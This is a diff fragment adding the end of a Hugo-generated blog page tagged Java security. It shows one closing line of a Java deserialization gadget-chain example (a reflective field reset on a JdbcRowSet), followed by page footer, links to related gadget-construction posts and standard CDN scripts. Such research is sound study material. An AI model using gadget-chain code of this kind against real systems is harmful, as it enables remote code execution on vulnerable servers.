+</span></span><span class="line"><span class="cl">        <span class="n">fee</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">jdbcRowSet</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+    </div>
+
+    
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/java%E5%AE%89%E5%85%A8/">Java安全</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/%E4%BD%BF%E7%94%A8%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0%E5%AE%8C%E5%85%A8%E4%B8%8D%E5%90%AB%E6%95%B0%E7%BB%84%E7%9A%84gadget/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">使用二次反序列化构造完全不含数组的Gadget</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/evaluatepostfix/">
+            <span class="next-text nav-default">中缀表达式求值</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:marszs.jin@foxmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/Marszs" class="iconfont icon-github" title="github"></a>
+  <a href="http://localhost:1313/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
